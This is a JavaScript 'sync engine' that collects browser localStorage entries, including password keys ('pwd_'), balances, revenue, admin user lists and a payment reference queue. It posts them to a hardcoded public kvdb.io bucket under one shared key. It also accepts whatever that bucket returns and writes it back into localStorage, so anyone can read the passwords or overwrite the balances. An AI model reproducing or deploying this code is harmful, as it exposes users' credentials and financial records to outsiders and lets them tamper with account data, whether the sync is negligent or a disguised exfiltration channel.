/**
 * ESHU CODEX - High-Availability Segregated Node Sync Engine
 * Refactored to force a unified pipeline configuration channel
 */

const BASE_CLUSTER_URL = "https://kvdb.io/LsoeLmZp8VtQZC1FuYZWtG/";

let lastSyncedPayloadString = "";
let isSyncInProgress = false;

function getActiveContextKey() {
    // Overriding split contexts ensures users and admins communicate via the same data channel
    const contextOverride = localStorage.getItem('__context_override');
    if (contextOverride) return contextOverride;
    
    return "global_nexus_master_registry";
}

async function pullFromCloudRegistry() {
    if (isSyncInProgress) return false;
    const contextKey = getActiveContextKey();
    
    try {
        const response = await fetch(`${BASE_CLUSTER_URL}${contextKey}?nocache=${Date.now()}`, {
            method: "GET",
            headers: { "Accept": "application/json" }
        });

        if (response.status === 404) return true;
        if (!response.ok) throw new Error(`Status ${response.status}`);

        const remoteData = await response.json();
        if (!remoteData || typeof remoteData !== "object") return false;

        Object.keys(remoteData).forEach(key => {
            let val = remoteData[key];
            if (typeof val === "object") val = JSON.stringify(val);
            localStorage.setItem(key, val);
        });

        lastSyncedPayloadString = JSON.stringify(remoteData);
        return true;
    } catch (error) {
        console.warn("⚠️ Downstream sync bypassed:", error.message);
        return false;
    }
}

async function uploadToCloudRegistry() {
    if (isSyncInProgress) return false;
    const contextKey = getActiveContextKey();
    
    try {
        const payload = {};

        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            
            // Build absolute state synchronization across key platform prefixes
            if (key.startsWith("NX-") || key.startsWith("pwd_") || key.startsWith("balance_") || 
                key.startsWith("revenue_") || key.startsWith("packages_") || key.startsWith("notice_") || 
                key.startsWith("popup_alert_") || key.includes("admin_crm_users") || 
                key.includes("admin_utr_queue") || key.includes("global_admin_notice")) {
                
                let val = localStorage.getItem(key);
                if (val && (val.startsWith("[") || val.startsWith("{"))) {
                    try { val = JSON.parse(val); } catch(e) {}
                }
                payload[key] = val;
            }
        }

        const currentPayloadString = JSON.stringify(payload);
        if (currentPayloadString === lastSyncedPayloadString || currentPayloadString === "{}") return true;

        isSyncInProgress = true;
        
        const response = await fetch(`${BASE_CLUSTER_URL}${contextKey}`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: currentPayloadString
        });

        isSyncInProgress = false;
        if (!response.ok) throw new Error(`Upstream replication denied: ${response.status}`);

        lastSyncedPayloadString = currentPayloadString;
        return true;
    } catch (error) {
        isSyncInProgress = false;
        console.error("❌ Upload aborted:", error.message);
        return false;
    }
}

if (typeof window !== 'undefined') {
    window.pullFromCloudRegistry = pullFromCloudRegistry;
    window.uploadToCloudRegistry = uploadToCloudRegistry;
    window.setSyncLockState = (state) => { isSyncInProgress = state; };
}
